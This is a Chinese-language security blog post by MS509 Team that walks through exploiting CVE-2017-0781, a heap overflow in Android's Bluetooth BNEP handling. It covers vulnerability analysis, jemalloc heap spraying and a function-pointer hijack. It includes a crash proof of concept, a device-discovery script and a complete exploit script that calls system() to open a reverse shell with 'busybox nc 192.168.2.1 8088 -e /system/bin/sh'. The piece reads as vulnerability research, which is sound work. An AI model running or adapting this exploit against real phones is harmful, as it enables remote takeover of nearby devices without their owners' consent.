<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</h1><div class="post-meta">2017-11-14<span> | </span><span class="category"><a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 2.8k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 11</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="post-content"><p>作者: thor</p>
<p>CVE-2017-0781是最近爆出的Android蓝牙栈的严重漏洞，允许攻击者远程获取Android手机的命令执行权限，危害相当大。armis给出的文档[1]中详细介绍了该漏洞的成因，但是并没有给出PoC和exploit，我们只好根据文档中的介绍自己摸索尝试编写exploit。</p>
<h2 id="0x00-测试环境"><a href="#0x00-测试环境" class="headerlink" title="0x00 测试环境"></a>0x00 测试环境</h2><ol>
<li>Android手机: Nexus 6p  </li>
<li>Android系统版本: android 7.0 userdebug</li>
<li>Ubuntu 16 + USB蓝牙适配器</li>
</ol>
<p>为了调试方便，nexus 6p刷了自己编译的AOSP 7.0 userdebug版本。</p>
<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>CVE-2017-0781是一个堆溢出漏洞，漏洞位置在bnep_data_ind函数中，如下所示：</p>
<p><img src="/2017/11/14/blueborne/1.png" alt="1"></p>
<p>p_bcb-&gt;p_pending_data指向申请的堆内存空间，但是memcpy的时候目的地址却是p_bcb-&gt;p_pending_data + 1，复制内存时目的地址往后扩展了sizeof(p_pending_data)字节，导致堆溢出。p_pending_data指向的是一个8个字节的结构体BT_HDR，所以这里将会导致8个字节的堆溢出。<br>该漏洞看上去十分明显，但是由于这是蓝牙bnep协议的扩展部分，所以估计测试都没覆盖到。</p>
<h2 id="0x02-PoC编写"><a href="#0x02-PoC编写" class="headerlink" title="0x02 PoC编写"></a>0x02 PoC编写</h2><p>该漏洞是蓝牙协议栈中BNEP协议处理时出现的漏洞，因此PoC的编写就是要向Android手机发送伪造的bnep协议包就行了。我们这里使用pybluez实现蓝牙发包，可以直接在Ubutnu上通过pip安装。armis的文档中给出了触发漏洞的bnep协议包格式：</p>
<p><img src="/2017/11/14/blueborne/2.png" alt="1"></p>
<p>PoC如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import bluetooth,sys</span><br><span class="line"></span><br><span class="line">def poc(target):</span><br><span class="line">        </span><br><span class="line">	pkt &#x3D; &#39;\x81\x01\x00&#39;+ &#39;\x41&#39;*8 </span><br><span class="line"></span><br><span class="line">	sock &#x3D; bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line"></span><br><span class="line">	sock.connect((target, 0xf))</span><br><span class="line"></span><br><span class="line">	for i in range(1000):</span><br><span class="line"></span><br><span class="line">	    sock.send(pkt)</span><br><span class="line">	    data &#x3D; sock.recv(1024)</span><br><span class="line">	      </span><br><span class="line">	sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">   if len(sys.argv) &lt; 2:</span><br><span class="line">      print &#39;No target specified.&#39;</span><br><span class="line">      sys.exit()</span><br><span class="line"></span><br><span class="line">   target &#x3D; sys.argv[1]</span><br><span class="line">   poc(target)</span><br></pre></td></tr></table></figure>

<p>简单说明一下PoC程序，我们首先通过BluetoothSocket建立与对方的L2CAP连接，类比于我们熟悉的TCP连接，然后我们在建立的L2CAP连接之上向对方发送bnep协议数据包，类比于建立TCP连接后发送的应用层数据包，而包的格式就是前面介绍的内容。我们知道触发漏洞后会覆盖堆中的内容，那么我们PoC的效果就是会用8个字节”A”覆盖堆中的某些数据。我们通过发送1000个构造的畸形数据包到对方，那么极有可能这其中就会覆盖到某些重要数据，导致蓝牙服务程序发生内存访问错误崩溃。<br>运行PoC:</p>
<p>   <code>python poc.py &lt;target&gt;</code></p>
<p>其中target是目标手机的蓝牙MAC地址，类似于wifi的MAC地址。PoC编写好后我们可以开始测试了，首先打开手机的蓝牙，然后我们在Ubuntu上运行以下脚本来查找附近的蓝牙设备：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import bluetooth</span><br><span class="line"></span><br><span class="line">nearby_devices &#x3D; bluetooth.discover_devices(lookup_names&#x3D;True)</span><br><span class="line">print(&quot;found %d devices&quot; % len(nearby_devices))</span><br><span class="line"></span><br><span class="line">for addr, name in nearby_devices:</span><br><span class="line">    print(&quot;  %s - %s&quot; % (addr, name))</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/2017/11/14/blueborne/6.png" alt="1"></p>
<p>发现的AOSP蓝牙设备就是我们的测试手机。直接运行PoC，并通过adb logcat 查看测试手机的日志：</p>
<p><img src="/2017/11/14/blueborne/8.png" alt="1"></p>
<p>可以看到我们的PoC直接远程让手机上的蓝牙服务崩溃，并且寄存器中出现了我们指定的内容，说明我们成功实现了堆溢出，覆盖了堆中的某些数据，导致蓝牙服务程序出现内存访问错误。至此，我们的PoC已经实现了远程使android手机蓝牙功能拒绝服务，下一步就是从堆溢出到获取命令执行权限的过程。</p>
<h2 id="0x03-exploit-编写"><a href="#0x03-exploit-编写" class="headerlink" title="0x03 exploit 编写"></a>0x03 exploit 编写</h2><p>Android使用的是jemalloc来管理堆内存，分配堆内存的时候内存块之间是没有元数据的，因此无法使用ptmalloc中覆盖元数据的漏洞利用方法。我们也是刚开始接触jemalloc，参考了[2]中的漏洞利用方法，发现由于该漏洞只能溢出8个字节的限制，似乎都不太好用。摸索好久最后发现只有期望于能够覆盖堆中的某些数据结构，而这些结构包含函数指针，从而获取代码执行权限。</p>
<p>我们知道jemalloc使用run来管理堆内存块，相同大小的堆内存在同一个run中挨着存放。因此，只要我们构造与目标数据结构相同大小的内存块，那么通过大量堆喷，则极有可能覆盖掉目标数据结构的前8个字节。该漏洞有一个优势就是我们可以控制申请的内存块大小，那么理论上我们就可以覆盖堆上绝大部分数据结构。</p>
<p>经过我们不断调试和测试，我们发现当我们申请的内存大小为32字节时，通过大量堆喷，我们可以覆盖fixed_queue_t数据结构的前8个字节，而该数据结构被蓝牙协议栈频繁使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct fixed_queue_t &#123;</span><br><span class="line">  list_t* list;</span><br><span class="line">  semaphore_t* enqueue_sem;</span><br><span class="line">  semaphore_t* dequeue_sem;</span><br><span class="line">  std::mutex* mutex;</span><br><span class="line">  size_t capacity;</span><br><span class="line"></span><br><span class="line">  reactor_object_t* dequeue_object;</span><br><span class="line">  fixed_queue_cb dequeue_ready;</span><br><span class="line">  void* dequeue_context;</span><br><span class="line">&#125; fixed_queue_t;</span><br></pre></td></tr></table></figure>

<p>我们覆盖的8个字节刚好能够覆盖list指针，list结构体如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct list_t &#123;</span><br><span class="line">  list_node_t* head;</span><br><span class="line">  list_node_t* tail;</span><br><span class="line">  size_t length;</span><br><span class="line">  list_free_cb free_cb;</span><br><span class="line">  const allocator_t* allocator;</span><br><span class="line">&#125; list_t;</span><br></pre></td></tr></table></figure>


<p>可以看到该结构体包含一个list_free_cb类型的变量，而该类型恰好为一个函数指针：</p>
<pre><code>typedef void (*list_free_cb)(void* data);</code></pre><p>那么我们的一种漏洞利用思路就有了，就是首先通过堆喷覆盖 fixed_queue_t前8个字节，控制list指针指向我们伪造的list_t结构体，从而控制free_cb的值，达到劫持pc的目的。当我们伪造的free_cb被调用的时候，那么进程的执行就会被我们控制。我们通过查看bt/osi/src下的源文件发现free_cb会在list_free_node_函数中被调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static list_node_t* list_free_node_(list_t* list, list_node_t* node) &#123;</span><br><span class="line">  CHECK(list !&#x3D; NULL);</span><br><span class="line">  CHECK(node !&#x3D; NULL);</span><br><span class="line"></span><br><span class="line">  list_node_t* next &#x3D; node-&gt;next;</span><br><span class="line"></span><br><span class="line">  if (list-&gt;free_cb) list-&gt;free_cb(node-&gt;data);</span><br><span class="line">  list-&gt;allocator-&gt;free(node);</span><br><span class="line">  --list-&gt;length;</span><br><span class="line"></span><br><span class="line">  return next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>我们继续查看调用，找到了一条触发的调用链：</p>
<pre><code>fixed_queue_try_enqueue--&gt;list_remove--&gt;list_free_node_-&gt;free_cb</code></pre><p>而fixed_queue_try_enqueue会在蓝牙栈的协议处理时用到，所以只要我们能控制list_t结构体，就能劫持蓝牙进程的执行。</p>
<p>接下来我们需要找到伪造list_t结构体的办法。我们首先可以假设我们通过大量堆喷，在堆中放置了很多我们伪造的list_t结构体，并且通过堆喷使得某已知堆地址addr_A恰好放置了我们伪造的一个list_t结构体，那么我们只需再通过堆喷来覆盖fixed_queue_t结构体的前8个字节，包内容如下所示：</p>
<pre><code>pkt = &apos;\x81\x01\x00&apos;+ struct.pack(&apos;&lt;I&apos;, addr_A) * 8</code></pre><p>通过这种覆盖，我们成功使得fixed_queue_t中的list指针指向我们伪造的list_t结构体，那么free_cb的执行将使我们成功劫持进程执行。</p>
<p>由上述可知，这种利用方法需要两次对喷，第一次先在堆中放置大量的list_t结构体，第二次再通过堆喷去溢出fixed_queue_t结构体。这里有一个难点就是第二次堆喷必须知道一个固定的堆地址，而这个地址需要第一次堆喷去覆盖到。一种方法是根据jemalloc的分配规则去爆破，另一种就是根据jemalloc分配规律硬编码一个地址。为了简单起见，我们使用第二种方法。我们第一次堆喷时选择堆块的大小为96字节，首先通过gdb调试观察jemalloc的分配：</p>
<p><img src="/2017/11/14/blueborne/9.png" alt="1"></p>
<p>我们多次调试发现，蓝牙进程每次重启后总有0xe6790000这条run是分配的96字节大小，那么我们可以选取这条run靠后的某个region作为我们的addr_A，这里我们选取0xe6792a00这个region：</p>
<p><img src="/2017/11/14/blueborne/10.png" alt="1"></p>
<p>还有一个问题就是由于堆喷的时候每个region的前8个字节可能会被覆盖掉，所以这里我们在放置伪造的list_t结构体时需要往后点，所以我们得到选取的addr_A为:</p>
<pre><code>addr_A =  0xe6792a00 + 8 </code></pre><p>接下来我们开始构造list_t结构体，如下图所示：</p>
<p>   <img src="/2017/11/14/blueborne/11.png" alt="1"></p>
<p>如果一切顺利，那么通过两次堆喷，我们将会劫持到PC，而蓝牙进程会在0x41414141处崩溃，测试过程这里不再演示，我们继续下一步。顺利劫持PC后，我们怎样能执行shellcode呢？一种复杂的方式是stack pivot + ROP + shellcode，另一种简单的就是ret2libc，直接跳转到libc中的system函数，我们只需提前构造好参数就行了。</p>
<p>我们调试和测试发现，当我们劫持pc执行system函数的时候，r0寄存器负责传递命令字符串参数地址，正好指向我们控制的list-&gt;head-&gt;data，因此我们只要构造好该参数即可。最终构造好的结构如下所示：</p>
<p> <img src="/2017/11/14/blueborne/12.png" alt="1"></p>
<p>为了防止进程意外崩溃，我们还原了list_t结构体中的allocator_t结构体，包含了osi中堆分配和回收的函数地址。这里用到的3个函数地址system、osi_alloc、osi_free都可以通过CVE-2017-0785的信息泄露漏洞获取到。</p>
<p>通过以上分析，我们可以得到第一次堆喷所发送的数据包内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkt &#x3D; &#39;\x81\x01\x00&#39;+  p32(addr_A+0x20 )*2 + &#39;\x01\x00\x00\x00&#39; + p32(system_addr) + p32(addr_A + 0x14) + p32(osi_alloc_addr) + p32(osi_free_addr)+ &#39;\x00&#39;*8 + p32(addr_A+0x28) + cmd_str + &#39;\x00&#39;*(48-len(cmd_str))</span><br></pre></td></tr></table></figure>



<p>综上所述，我们可以得到exploit脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import bluetooth,time</span><br><span class="line"></span><br><span class="line">addr_A &#x3D; 0xe6792a00 + 8</span><br><span class="line"></span><br><span class="line">cmd_str &#x3D; &quot;busybox nc 192.168.2.1 8088 -e &#x2F;system&#x2F;bin&#x2F;sh &amp;&quot; + &#39;\x00&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base &#x3D; 0xf34cf000</span><br><span class="line">system_addr &#x3D; libc_base + 0x64a30 + 1</span><br><span class="line"></span><br><span class="line">bluetooth_base_addr &#x3D; 0xeb901000</span><br><span class="line">osi_alloc_addr &#x3D; bluetooth_base_addr + 0x15b885</span><br><span class="line">osi_free_addr &#x3D; bluetooth_base_addr + 0x15b8e5</span><br><span class="line"></span><br><span class="line">pkt1 &#x3D; &#39;\x81\x01\x00&#39;+  p32(addr_A+0x20)*2 + &#39;\x01\x00\x00\x00&#39; + p32(system_addr) + p32(addr_A+0x14) + p32(osi_alloc_addr) + p32(osi_free_addr)+ &#39;\x00&#39;*8 + p32(addr_A+0x28) + cmd_str + &#39;\x00&#39;*(48-len(cmd_str)) </span><br><span class="line">                       </span><br><span class="line">pkt2 &#x3D; &#39;\x81\x01\x00&#39;+ p32(addr_A) * 8</span><br><span class="line">  </span><br><span class="line">def heap_spray():</span><br><span class="line"></span><br><span class="line">	sock &#x3D; bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line"></span><br><span class="line">	sock.connect((target, 0xf))</span><br><span class="line"></span><br><span class="line">	for i in range(500):</span><br><span class="line"></span><br><span class="line">		sock.send(pkt1)</span><br><span class="line">		data &#x3D; sock.recv(1024)</span><br><span class="line">	</span><br><span class="line">	sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def heap_overflow():</span><br><span class="line"></span><br><span class="line">	sock &#x3D; bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line"></span><br><span class="line">	sock.connect((target, 0xf))</span><br><span class="line"></span><br><span class="line">	for i in range(3000):</span><br><span class="line"></span><br><span class="line">		sock.send(pkt2)</span><br><span class="line">		data &#x3D; sock.recv(1024)</span><br><span class="line"></span><br><span class="line">	sock.close()</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">     if len(sys.argv) &lt; 2:</span><br><span class="line">        print &#39;No target specified.&#39;</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">     target &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">     print &quot;start heap spray&quot;</span><br><span class="line">     heap_spray()</span><br><span class="line"></span><br><span class="line">     time.sleep(10)</span><br><span class="line"></span><br><span class="line">     print &quot;start heap overflow&quot;</span><br><span class="line">     heap_overflow()</span><br></pre></td></tr></table></figure>



<p>脚本中libc.so和bluetooth.default.so的加载基址可由信息泄露漏洞获得，这里我们直接给出。脚本中通过system函数执行的是通过nc反弹shell的命令，我们首先在本地通过nc监听8088端口，然后运行exploit脚本如下：</p>
<p> <img src="/2017/11/14/blueborne/14.png" alt="1"></p>
<p> 如果两次堆喷都成功的话，我们可以在本地得到反弹的shell，用户为bluetooth:</p>
<p>  <img src="/2017/11/14/blueborne/13.png" alt="1"></p>
<p> 一般情况下执行3到5次exploit就能成功反弹shell。</p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本文研究了Android蓝牙栈的远程命令执行漏洞CVE-2017-0781，探索了从PoC到编写exploit的过程，算是比较顺利地写出了exploit，还有一点缺陷就是堆中固定地址addr_A的获取，现在暂时只能根据不同手机硬编码。欢迎大家一起研究探讨！</p>
<p>##参考文献：</p>
<p>[1] <a href>http://go.armis.com/hubfs/BlueBorne%20Technical%20White%20Paper.pdf</a><br>[2] <a href>http://phrack.org/issues/68/10.html</a></p>
</div><div class="tags"><a href="/tags/Android/"><i class="fa fa-tag"></i>Android</a></div><div class="post-nav"><a class="pre" href="/2017/12/22/android-blueborne2/">Android蓝牙远程命令执行漏洞利用实践 exploit优化</a><a class="next" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/" style="font-size: 15px;">登陆凭证</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 15px;">内网穿透</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/WAF%E7%BB%95%E8%BF%87/" style="font-size: 15px;">WAF绕过</a> <a href="/tags/Window/" style="font-size: 15px;">Window</a> <a href="/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" style="font-size: 15px;">杀毒软件</a> <a href="/tags/Cknife/" style="font-size: 15px;">Cknife</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">审计工具</a> <a href="/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 15px;">恶意程序</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/IOS/" style="font-size: 15px;">IOS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/Dsmall-Code-Audit/">DSMall的那些洞，你能发现吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/Waf-Bypass-Sql/">WAF绕过奇技淫巧之SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Collect-login-credentials/">linux后渗透之收集登录凭证</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Intranet-penetration/">内网渗透之内网穿透</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/Subrion-Cms-Code-Audit/">Subrion CMS 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/19/Java-Debug/">Java无源码调试之英雄崛起</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-smep-bypass/">CVE-2017-8890实现linux内核提权- SMEP绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>